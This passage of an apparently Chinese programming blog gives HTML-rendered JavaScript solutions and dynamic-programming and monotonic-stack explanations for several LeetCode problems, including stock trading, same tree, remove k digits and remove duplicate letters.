class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">'['</span><span class="token punctuation">)</span> <span class="token punctuation">,</span>number <span class="token operator">=</span> item<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> pos<span class="token punctuation">)</span>            <span class="token keyword">let</span> str <span class="token operator">=</span> item<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span>pos <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> item<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> res <span class="token operator">=</span> <span class="token string">''</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> number<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> res <span class="token operator">+</span><span class="token operator">=</span> str            <span class="token keyword">return</span> res        <span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> s<span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><h2 id="买卖股票的最佳时机"><a href="#买卖股票的最佳时机" class="headerlink" title="买卖股票的最佳时机"></a>买卖股票的最佳时机</h2><ul><li><a href="https://leetcode-cn.com/problems/best-time-to-buy-and-sell-stock/" target="_blank" rel="noopener">leetcode121</a></li></ul><pre class=" language-js"><code class="language-js">给定一个数组，它的第 i 个元素是一支给定股票第 i 天的价格。如果你最多只允许完成一笔交易（即买入和卖出一支股票一次），设计一个算法来计算你所能获取的最大利润。注意：你不能在买入股票前卖出股票。示例 <span class="token number">1</span><span class="token punctuation">:</span>输入<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">]</span>输出<span class="token punctuation">:</span> <span class="token number">5</span>解释<span class="token punctuation">:</span> 在第 <span class="token number">2</span> 天（股票价格 <span class="token operator">=</span> <span class="token number">1</span>）的时候买入，在第 <span class="token number">5</span> 天（股票价格 <span class="token operator">=</span> <span class="token number">6</span>）的时候卖出，最大利润 <span class="token operator">=</span> <span class="token number">6</span><span class="token operator">-</span><span class="token number">1</span> <span class="token operator">=</span> <span class="token number">5</span> 。     注意利润不能是 <span class="token number">7</span><span class="token operator">-</span><span class="token number">1</span> <span class="token operator">=</span> <span class="token number">6</span><span class="token punctuation">,</span> 因为卖出价格需要大于买入价格；同时，你不能在买入前卖出股票。示例 <span class="token number">2</span><span class="token punctuation">:</span>输入<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span>输出<span class="token punctuation">:</span> <span class="token number">0</span>解释<span class="token punctuation">:</span> 在这种情况下<span class="token punctuation">,</span> 没有交易完成<span class="token punctuation">,</span> 所以最大利润为 <span class="token number">0</span>。</code></pre><blockquote><p>设 <code>dp[i]</code>为<code>i</code>支股票的最大利润，若已知前<code>i-1</code>支股票的最大利润为 <code>dp[i-1]</code>，怎么建立动态转移方程？</p><p>如果记录了前<code>i-1</code>支股票的最小值 min，那么最大利润一定是第<code>i</code>支股票的价格减去min所得的值与<code>dp[i-1]</code>之间的最大值，所以只需计算一下 <code>price[i] - min</code> 与<code>dp[i]</code> 的最大值</p></blockquote><ul><li>动态规划的三要素：最优子结构，边界，状态转移方程</li><li><code>dp[i]</code> 的 最优子结构就是 <code>dp[i-1]</code></li><li>边界：<code>dp[0] = 0</code></li><li>状态转移方程：<code>dp[i] = Math.max(dp[i-1], prices[i] - min);</code></li></ul><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> maxProfit <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>prices<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">let</span> dp <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Array</span><span class="token punctuation">(</span>prices<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">fill</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    dp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">let</span> min <span class="token operator">=</span> prices<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> prices<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> prices<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> min<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>min <span class="token operator">></span> prices<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            min <span class="token operator">=</span> prices<span class="token punctuation">[</span>i<span class="token punctuation">]</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> dp<span class="token punctuation">[</span>dp<span class="token punctuation">.</span>length<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><p>代码优化之后（看了<a href="https://leetcode-cn.com/problems/best-time-to-buy-and-sell-stock/solution/121-mai-mai-gu-piao-de-zui-jia-shi-ji-by-leetcode-/" target="_blank" rel="noopener">官方题解</a>才领悟到不用 dp 也可直接写出如下）</p><pre class=" language-js"><code class="language-js"><span class="token keyword">let</span> maxProfit <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>prices<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">let</span> max <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> min <span class="token operator">=</span> prices<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> prices<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        min <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">min</span><span class="token punctuation">(</span>prices<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> min<span class="token punctuation">)</span>        max <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>max<span class="token punctuation">,</span> prices<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> min<span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> max<span class="token punctuation">}</span></code></pre><h2 id="买卖股票的最佳时机（含冷冻期）"><a href="#买卖股票的最佳时机（含冷冻期）" class="headerlink" title="买卖股票的最佳时机（含冷冻期）"></a>买卖股票的最佳时机（含冷冻期）</h2><pre class=" language-js"><code class="language-js">给定一个整数数组，其中第 i 个元素代表了第 i 天的股票价格 。设计一个算法计算出最大利润。在满足以下约束条件下，你可以尽可能地完成更多的交易（多次买卖一支股票）<span class="token punctuation">:</span>你不能同时参与多笔交易（你必须在再次购买前出售掉之前的股票）。卖出股票后，你无法在第二天买入股票 <span class="token punctuation">(</span>即冷冻期为 <span class="token number">1</span> 天<span class="token punctuation">)</span>。示例<span class="token punctuation">:</span>输入<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">]</span>输出<span class="token punctuation">:</span> <span class="token number">3</span> 解释<span class="token punctuation">:</span> 对应的交易状态为<span class="token punctuation">:</span> <span class="token punctuation">[</span>买入<span class="token punctuation">,</span> 卖出<span class="token punctuation">,</span> 冷冻期<span class="token punctuation">,</span> 买入<span class="token punctuation">,</span> 卖出<span class="token punctuation">]</span></code></pre><ul><li>这道题自己没有想出来，看了很多题解，自己理解一下</li><li>设 <code>dp[i]</code> 为 截止至第<code>i</code>天的最大收益</li><li>对于每一天<code>i</code>都有两种状态<strong>持股</strong>和<strong>不持股</strong>，而不持股又分为<strong>当天卖出</strong>和<strong>本来就没有</strong><ul><li>持股：设为<code>dp[i][1]</code></li><li>不持股<ul><li>当天卖出了股票所以没有，设为<code>dp[i][2]</code></li><li>前一天就没有，今天也没有，设为<code>dp[i][0]</code></li></ul></li></ul></li><li>状态确定好后，下面就是如何建立状态转移方程？<ul><li>当天持股分为两种情况：<strong>当天买入</strong>和<strong>本来就有</strong>，找出效益最大值<ul><li>当天买入，前一天一定没有并且前一天没有卖出（<code>dp[i-1][0]</code>）,此时效益为<code>dp[i-1][0] - p[i]</code></li><li>前一天本来就有，此时的效益为<code>dp[i-1][1]</code></li><li>状态转移方程：<code>dp[i][1] = max(dp[i-1][1], dp[i-1][0] - p[i])</code></li></ul></li><li>不持股（当天卖出所以没有）<ul><li>当天卖出，前一天一定持有，此时的最大效益就是前一天的效益 + 卖出的价格</li><li>状态转移方程：<code>dp[i][2] = dp[i-1][1] + p[i]</code></li></ul></li><li>不持股（本来就没有）<ul><li>说明前一天也没有，最大效益就是前一天两种没有状态的最大值</li><li>状态转移方程：<code>dp[i][0] = max(dp[i-1][0],dp[i-1][2])</code></li></ul></li></ul></li><li>截止最后一天的最大效益一定是不持有状态的</li><li>边界：<code>dp[0][0] =  0</code>,<code>dp[0][2] = 0</code>,<code>dp[0][1] = -p[0]</code> </li></ul><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> maxProfit <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>prices<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>prices<span class="token punctuation">.</span>length <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span>    <span class="token keyword">const</span> len <span class="token operator">=</span> prices<span class="token punctuation">.</span>length    <span class="token keyword">let</span> dp <span class="token operator">=</span> Array<span class="token punctuation">.</span><span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Array</span><span class="token punctuation">(</span>len<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token keyword">new</span> <span class="token class-name">Array</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">fill</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    dp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>    dp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>    dp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span>prices<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> len<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> dp<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">-</span> prices<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>        dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> dp<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> prices<span class="token punctuation">[</span>i<span class="token punctuation">]</span>        dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> dp<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>len<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> dp<span class="token punctuation">[</span>len<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><h2 id="相同的树"><a href="#相同的树" class="headerlink" title="相同的树"></a>相同的树</h2><ul><li><a href="https://leetcode-cn.com/problems/same-tree/" target="_blank" rel="noopener">leetcode100</a></li></ul><pre class=" language-js"><code class="language-js">给定两个二叉树，编写一个函数来检验它们是否相同。如果两个树在结构上相同，并且节点具有相同的值，则认为它们是相同的。示例 <span class="token number">1</span><span class="token punctuation">:</span>输入<span class="token punctuation">:</span>       <span class="token number">1</span>         <span class="token number">1</span>          <span class="token operator">/</span> \       <span class="token operator">/</span> \         <span class="token number">2</span>   <span class="token number">3</span>     <span class="token number">2</span>   <span class="token number">3</span>        <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span>   <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span>输出<span class="token punctuation">:</span> <span class="token boolean">true</span>示例 <span class="token number">2</span><span class="token punctuation">:</span>输入<span class="token punctuation">:</span>      <span class="token number">1</span>          <span class="token number">1</span>          <span class="token operator">/</span>           \         <span class="token number">2</span>             <span class="token number">2</span>        <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span>     <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">]</span>输出<span class="token punctuation">:</span> <span class="token boolean">false</span>示例 <span class="token number">3</span><span class="token punctuation">:</span>输入<span class="token punctuation">:</span>       <span class="token number">1</span>         <span class="token number">1</span>          <span class="token operator">/</span> \       <span class="token operator">/</span> \         <span class="token number">2</span>   <span class="token number">1</span>     <span class="token number">1</span>   <span class="token number">2</span>        <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>   <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">]</span>输出<span class="token punctuation">:</span> <span class="token boolean">false</span></code></pre><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// 递归</span><span class="token keyword">var</span> isSameTree <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> q<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>p <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> q <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">true</span>    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>p <span class="token operator">===</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> q <span class="token operator">!==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span>p <span class="token operator">!==</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> q <span class="token operator">===</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span>    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>val <span class="token operator">!==</span> q<span class="token punctuation">.</span>val<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span>    <span class="token keyword">else</span> <span class="token keyword">return</span> <span class="token function">isSameTree</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>left<span class="token punctuation">,</span> q<span class="token punctuation">.</span>left<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isSameTree</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>right<span class="token punctuation">,</span> q<span class="token punctuation">.</span>right<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><h2 id="去除重复字母"><a href="#去除重复字母" class="headerlink" title="去除重复字母"></a>去除重复字母</h2><ul><li><a href="https://leetcode-cn.com/problems/remove-duplicate-letters/" target="_blank" rel="noopener">leetcode316</a>：这道题应用的算法与数据结构是：<strong>贪心+单调栈</strong>，类似的题目还有</li><li><a href="https://leetcode-cn.com/problems/remove-k-digits" target="_blank" rel="noopener">leetcode402</a>：移掉 k 位数字</li><li><a href="https://leetcode-cn.com/problems/trapping-rain-water/" target="_blank" rel="noopener">leetcode42</a>：接雨水（hard）</li></ul><p>由浅入深，首先来看一下<strong>移掉 k 位数字</strong>这道题</p><pre class=" language-js"><code class="language-js">给定一个以字符串表示的非负整数 num，移除这个数中的 k 位数字，使得剩下的数字最小。注意<span class="token punctuation">:</span>num 的长度小于 <span class="token number">10002</span> 且 ≥ k。num 不会包含任何前导零。示例 <span class="token number">1</span> <span class="token punctuation">:</span>输入<span class="token punctuation">:</span> num <span class="token operator">=</span> <span class="token string">"1432219"</span><span class="token punctuation">,</span> k <span class="token operator">=</span> <span class="token number">3</span>输出<span class="token punctuation">:</span> <span class="token string">"1219"</span>解释<span class="token punctuation">:</span> 移除掉三个数字 <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> 和 <span class="token number">2</span> 形成一个新的最小的数字 <span class="token number">1219</span>。示例 <span class="token number">2</span> <span class="token punctuation">:</span>输入<span class="token punctuation">:</span> num <span class="token operator">=</span> <span class="token string">"10200"</span><span class="token punctuation">,</span> k <span class="token operator">=</span> <span class="token number">1</span>输出<span class="token punctuation">:</span> <span class="token string">"200"</span>解释<span class="token punctuation">:</span> 移掉首位的 <span class="token number">1</span> 剩下的数字为 <span class="token number">200</span><span class="token punctuation">.</span> 注意输出不能有任何前导零。示例 <span class="token number">3</span> <span class="token punctuation">:</span>输入<span class="token punctuation">:</span> num <span class="token operator">=</span> <span class="token string">"10"</span><span class="token punctuation">,</span> k <span class="token operator">=</span> <span class="token number">2</span>输出<span class="token punctuation">:</span> <span class="token string">"0"</span>解释<span class="token punctuation">:</span> 从原数字移除所有的数字，剩余为空就是<span class="token number">0</span>。</code></pre><blockquote><p>给定一个数字序列，例如 425，如果要求我们只删除一个数字，那么从左到右，我们有 4、2 和 5 三个选择。我们将每一个数字和它的左邻居进行比较。从 2 开始，小于它的左邻居 4。则我们应该去掉数字 4。如果不这么做，则随后无论做什么，都不会得到最小数。</p><p>如果我们保留数字 4，那么所有可能的组合都是以数字 4（即 42，45）开头的。相反，如果去掉 4，留下 2，我们得到的是以 2 开头的组合（即 25），这明显小于任何留下数字 4 的组合。</p><p>这个问题可以用贪心算法来解决。上述规则阐明了我们如何接近最终答案的基本逻辑。一旦我们从序列中删除一个数字，剩下的数字就形成了一个新的问题，我们可以继续使用这个规则。</p></blockquote><ul><li>思路：从左向右遍历入栈，若下一个数更小，则上一个数出栈（贪心：局部最优），维护一个单调栈。</li><li>若 num 是一个增序序列，则不会出栈；是一个降序序列，则会一直出栈。</li><li><p>具体解决：</p><ul><li>每丢弃一次数字，k 减去 1。当 k 减到 0 ，我们可以提前终止遍历。</li><li><p>而当遍历完成，如果 k 仍然大于 0。不妨假设最终还剩下 x 个需要丢弃，那么我们需要选择删除末尾 x 个元素（因为遍历之后形成的栈已经单调，直接删除末尾的就好）。</p></li><li><p>要设置 while 循环，因为如果输入为(“1234567890”, 9)，当遍历到 0 时，比栈顶元素9小，9出栈之后0依旧比栈顶元素8小，所以要设置循环，当 num[i] 一直比栈顶元素小时，则继续出栈</p></li><li>保证数字范围使用 BigInt</li><li>若 num.length === k，说明全部删除，直接返回 “0”</li></ul></li></ul><pre class=" language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">removeKdigits</span><span class="token punctuation">(</span>num<span class="token punctuation">,</span> k<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">let</span> stack <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">let</span> n <span class="token operator">=</span> k    <span class="token keyword">if</span> <span class="token punctuation">(</span>num<span class="token punctuation">.</span>length <span class="token operator">===</span> k<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token string">"0"</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> num<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>n <span class="token operator">&amp;&amp;</span> num<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> stack<span class="token punctuation">[</span>stack<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            stack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span>            n<span class="token operator">--</span>        <span class="token punctuation">}</span>        stack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>num<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token function">BigInt</span><span class="token punctuation">(</span>stack<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> num<span class="token punctuation">.</span>length <span class="token operator">-</span> k<span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><p>我们再回来看去除重复字母这道题</p><pre class=" language-js"><code class="language-js">给你一个字符串 s ，请你去除字符串中重复的字母，使得每个字母只出现一次。需保证 返回结果的字典序最小（要求不能打乱其他字符的相对位置）。 示例 <span class="token number">1</span>：输入：s <span class="token operator">=</span> <span class="token string">"bcabc"</span>输出：<span class="token string">"abc"</span>示例 <span class="token number">2</span>：输入：s <span class="token operator">=</span> <span class="token string">"cbacdcbc"</span>输出：<span class="token string">"acdb"</span></code></pre><blockquote><p>这道题和上题解法类似，不同之处在于去除的元素是基于不重复的规则，所以想到的是用一个结构存储每个字符出现的次数，当字符次数只有一次时不能去除该字符</p></blockquote><ul><li>我这里采用 map 存储字符串每个字符出现的次数</li><li>从左向右遍历字符串，每访问一个字符时和栈顶字符比较字典序，若小于栈顶元素，栈顶元素先出栈（出栈时需判断栈顶字符的次数，为1的时候不能出栈），当前字符再入栈</li><li>每访问一个字符，当前字符次数减一</li></ul><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> removeDuplicateLetters <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">const</span> stack <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">const</span> map <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Map</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token keyword">in</span> s<span class="token punctuation">)</span> <span class="token punctuation">{</span>        map<span class="token punctuation">.</span><span class="token function">has</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> map<span class="token punctuation">.</span><span class="token keyword">set</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> map<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> map<span class="token punctuation">.</span><span class="token keyword">set</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token keyword">in</span> s<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>stack<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">while</span> <span class="token punctuation">(</span>stack<span class="token punctuation">.</span>length <span class="token operator">&amp;&amp;</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> stack<span class="token punctuation">[</span>stack<span class="token punctuation">.</span>length<span class="token number">-1</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> map<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span>stack<span class="token punctuation">[</span>stack<span class="token punctuation">.</span>length<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                stack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token punctuation">}</span>            stack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span>        map<span class="token punctuation">.</span><span class="token keyword">set</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> map<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> stack<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><h2 id="接雨水"><a href="#接雨水" class="headerlink" title="接雨水"></a>接雨水</h2><ul><li><a href="https://leetcode-cn.com/problems/trapping-rain-water/" target="_blank" rel="noopener">leetcode42</a></li></ul><pre class=" language-js"><code class="language-js">输入：height <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token 